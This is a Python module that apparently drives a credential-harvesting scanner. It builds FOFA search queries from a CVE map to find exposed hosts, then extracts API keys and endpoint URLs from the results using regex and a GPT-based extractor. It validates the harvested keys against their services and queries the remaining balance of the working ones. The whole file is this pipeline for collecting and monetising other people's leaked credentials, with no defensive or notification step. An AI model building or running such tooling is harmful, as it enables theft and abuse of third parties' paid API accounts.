from __future__ import annotations

import logging
from datetime import UTC, datetime

from .config import settings
from .extractor import extract_credentials
from .fofa_client import FofaClient
from .models import ScanRunResult, ValidationResult
from .queries import build_queries
from .validator import validate_all

log = logging.getLogger(__name__)


async def run_scan(max_queries: int | None = None) -> ScanRunResult:
    started = datetime.now(UTC).isoformat()
    queries = build_queries()
    if max_queries:
        queries = queries[:max_queries]

    log.info("Built %d FOFA queries from CVE map", len(queries))

    all_hits: list[dict] = []
    queries_used: list[str] = []
    with FofaClient() as fofa:
        for i, q in enumerate(queries, 1):
            log.info("[%d/%d] %s | %s", i, len(queries), q["cve_id"], q["query"][:80])
            hits = fofa.search(q["query"], pages=settings.fofa_max_pages)
            if hits:
                for h in hits:
                    if isinstance(h, dict):
                        h.setdefault("_cve", q["cve_id"])
                        h.setdefault("_product", q["product"])
                all_hits.extend(hits)
                queries_used.append(q["query"])
            log.info("  accumulated %d hits", len(all_hits))

    log.info("Total hits: %d. Extracting credentials...", len(all_hits))
    creds = extract_credentials(all_hits)
    log.info("Extracted %d candidate credentials (regex)", len(creds))

    from .writer import write_raw_hits

    write_raw_hits(all_hits)

    from .analyzer import extract_with_gpt

    gpt_creds = await extract_with_gpt(all_hits[:500])
    if gpt_creds:
        existing_keys = {(c.apikey, c.apiurl) for c in creds}
        for gc in gpt_creds:
            if (gc.apikey, gc.apiurl) not in existing_keys:
                creds.append(gc)
                existing_keys.add((gc.apikey, gc.apiurl))
        log.info("After GPT enrichment: %d candidate credentials", len(creds))

    if not creds:
        return ScanRunResult(
            started_at=started,
            finished_at=datetime.now(UTC).isoformat(),
            total_hosts=len(all_hits),
            total_credentials=0,
            total_valid=0,
            queries_used=queries_used,
            results=[],
            raw_hits=_trim_hits(all_hits),
        )

    log.info("Validating %d credentials (concurrency=%d)...", len(creds), settings.validate_concurrency)
    results: list[ValidationResult] = await validate_all(creds)

    if settings.gpt_key:
        from .analyzer import recheck_all_with_gpt

        results = list(await recheck_all_with_gpt(results))

    valid = [r for r in results if r.valid]
    log.info("Validation done: %d valid / %d total", len(valid), len(results))

    if valid:
        from .balance import enrich_results

        log.info("Querying balance for %d valid credentials...", len(valid))
        results = await enrich_results(results)
        valid = [r for r in results if r.valid]
        log.info("Balance enrichment done.")

    return ScanRunResult(
        started_at=started,
        finished_at=datetime.now(UTC).isoformat(),
        total_hosts=len(all_hits),
        total_credentials=len(creds),
        total_valid=len(valid),
        queries_used=queries_used,
        results=results,
        raw_hits=_trim_hits(all_hits),
    )


def _trim_hits(hits: list[dict], limit: int = 500) -> list[dict]:
    if len(hits) <= limit:
        return hits
    return hits[:limit]
